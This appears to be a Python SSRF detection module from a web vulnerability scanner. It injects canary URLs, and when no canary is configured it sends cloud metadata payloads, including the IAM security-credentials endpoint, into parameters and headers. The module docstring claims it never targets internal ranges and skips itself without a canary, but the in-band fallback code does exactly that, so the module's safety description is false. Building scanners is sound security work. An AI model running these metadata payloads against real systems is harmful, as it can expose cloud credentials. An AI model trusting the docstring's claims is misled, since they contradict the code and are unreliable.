"""SSRF detection via out-of-band interaction — CANARY DOMAIN ONLY.

This module injects URLs that point exclusively at the user-configured
verification/canary domain (a host you control). It NEVER targets internal
ranges or third-party hosts. If no canary domain is configured, the module
skips itself entirely.

Detection:
  * If an OOB poll logger is configured, each token is checked and confirmed
    hits are reported as HIGH/Confirmed.
  * Otherwise, payloads are sent (callbacks will land in YOUR canary logs) and a
    single summary finding lists the tokens/points to correlate manually.
"""
from __future__ import annotations

import re

from modules.base import BaseModule, ScanContext, register
from core.result import Finding, Severity
from core.injection_points import discover_points, send

# Request headers that are commonly SSRF-able (server fetches the value).
SSRF_HEADERS = ["Referer", "X-Forwarded-Host", "X-Forwarded-For", "Forwarded",
                "True-Client-IP", "X-Real-IP", "X-Client-IP", "CF-Connecting-IP"]

# In-band SSRF: cloud metadata endpoints whose contents, if reflected in the
# response, prove a server-side fetch happened (no OOB canary needed).
_META = [
    ("http://169.254.169.254/latest/meta-data/",
     re.compile(r"ami-id|instance-id|iam/|placement|public-keys|hostname", re.I)),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/",
     re.compile(r"AccessKeyId|SecretAccessKey|Token|Role", re.I)),
    ("http://metadata.google.internal/computeMetadata/v1/instance/?recursive=true",
     re.compile(r"serviceAccounts|projectId|machineType|zone", re.I)),
    ("http://100.100.100.200/latest/meta-data/",              # Alibaba Cloud
     re.compile(r"region-id|instance-id|image-id", re.I)),
]


@register
class SSRF(BaseModule):
    id = "ssrf"
    name = "SSRF (out-of-band, canary only)"
    category = "Injection"
    description = ("Injects canary-domain URLs into params and SSRF-prone headers; confirms via OOB "
                   "callback. Requires a verification domain — skips otherwise.")

    def _payloads(self, oob, token: str) -> list[str]:
        host = oob.host(token)
        return [
            oob.payload_url(token, "http"),
            oob.payload_url(token, "https"),
            f"//{host}/",
            host,
        ]

    def _inband(self, ctx: ScanContext) -> list[Finding]:
        """No canary: run SSRF directly using in-band cloud-metadata detection."""
        findings: list[Finding] = []
        points = discover_points(ctx)
        ctx.log(f"    (no canary) in-band SSRF: probing metadata via {len(points)} param point(s) + headers")
        for pt in points:
            if ctx.should_stop():
                break
            for url, sig in _META:
                if ctx.should_stop():
                    break
                r = send(ctx, pt, url)
                if r is not None and sig.search((r.text or "")[:6000]):
                    findings.append(Finding(
                        module_id=self.id, title=f"SSRF (cloud metadata) via {pt.label()}",
                        severity=Severity.HIGH, url=pt.base_url, confidence="Firm",
                        description="Injecting a cloud-metadata URL returned metadata content in the response — "
                                    "an in-band SSRF reaching the instance metadata service.",
                        evidence=f"payload {url} -> metadata signature matched",
                        request=f"{pt.method} {pt.base_url} ({pt.param}={url})",
                        impact="메타데이터 IAM 자격증명 탈취 → 클라우드 계정 피벗.",
                        remediation="Block link-local/metadata IPs; require IMDSv2; allow-list outbound URLs."))
                    return findings
        for header in SSRF_HEADERS:
            if ctx.should_stop():
                break
            url, sig = _META[0]
            try:
                r = ctx.paced_request("GET", ctx.target, headers={header: url})
            except Exception:
                r = None
            if r is not None and sig.search((r.text or "")[:6000]):
                findings.append(Finding(
                    module_id=self.id, title=f"SSRF (cloud metadata) via '{header}' header",
                    severity=Severity.HIGH, url=ctx.target, confidence="Firm",
                    description=f"The server fetched a metadata URL supplied in the '{header}' header (in-band SSRF).",
                    evidence=f"{header}: {url} -> metadata signature matched",
                    remediation="Do not build server requests from client-supplied host/URL headers."))
                return findings
        # Nothing reflected → no confirmable signal. Stay silent (avoid a false positive);
        # blind SSRF needs an OOB canary, which the canary path handles when configured.
        return findings

    def run(self, ctx: ScanContext) -> list[Finding]:
        oob = ctx.oob
        if oob is None or not oob.enabled:
            return self._inband(ctx)

        findings: list[Finding] = []
        tested: list[str] = []
        poll = bool(oob.poll_url)

        # 1) Parameter-based SSRF.
        points = discover_points(ctx)
        if points:
            ctx.log(f"    injecting canary into {len(points)} param point(s)")
        for pt in points:
            if ctx.should_stop():
                break
            token = oob.new_token("p")
            hit = False
            for payload in self._payloads(oob, token):
                if ctx.should_stop():
                    break
                send(ctx, pt, payload)
            tested.append(f"param {pt.label()} -> {oob.host(token)}")
            if poll and oob.check(token):
                findings.append(Finding(
                    module_id=self.id,
                    title=f"SSRF confirmed via {pt.label()}",
                    severity=Severity.HIGH,
                    url=pt.base_url,
                    confidence="Confirmed",
                    description="Server-side request to the canary domain confirmed via OOB callback.",
                    evidence=f"Canary interaction token: {token} ({oob.host(token)})",
                    request=f"{pt.method} {pt.base_url}  ({pt.param}=<canary>)",
                    remediation="Validate/allow-list outbound URLs; block internal ranges & metadata IPs.",
                ))

        # 2) Header-based SSRF.
        if not ctx.should_stop():
            for header in SSRF_HEADERS:
                if ctx.should_stop():
                    break
                token = oob.new_token("h")
                try:
                    ctx.paced_request("GET", ctx.target,
                                      headers={header: oob.payload_url(token, "http")})
                except Exception:
                    pass
                tested.append(f"header {header} -> {oob.host(token)}")
                if poll and oob.check(token):
                    findings.append(Finding(
                        module_id=self.id,
                        title=f"SSRF confirmed via '{header}' header",
                        severity=Severity.HIGH,
                        url=ctx.target,
                        confidence="Confirmed",
                        description=f"Server fetched the canary URL supplied in the '{header}' header.",
                        evidence=f"Canary interaction token: {token} ({oob.host(token)})",
                        remediation="Do not use client-supplied host/URL headers to build server requests.",
                    ))

        # 3) If we can't auto-confirm, hand back the tokens to check manually.
        if not poll and tested:
            findings.append(Finding(
                module_id=self.id,
                title="SSRF canary payloads sent — verify against your OOB logs",
                severity=Severity.INFO,
                url=ctx.target,
                confidence="Tentative",
                description=("No OOB poll logger configured, so callbacks could not be auto-confirmed. "
                             "Check your canary domain's logs for any of the tokens below; a hit = SSRF."),
                evidence="\n".join(tested[:60]),
                remediation="Configure an OOB poll URL for automatic confirmation, or inspect canary logs.",
            ))
        return findings
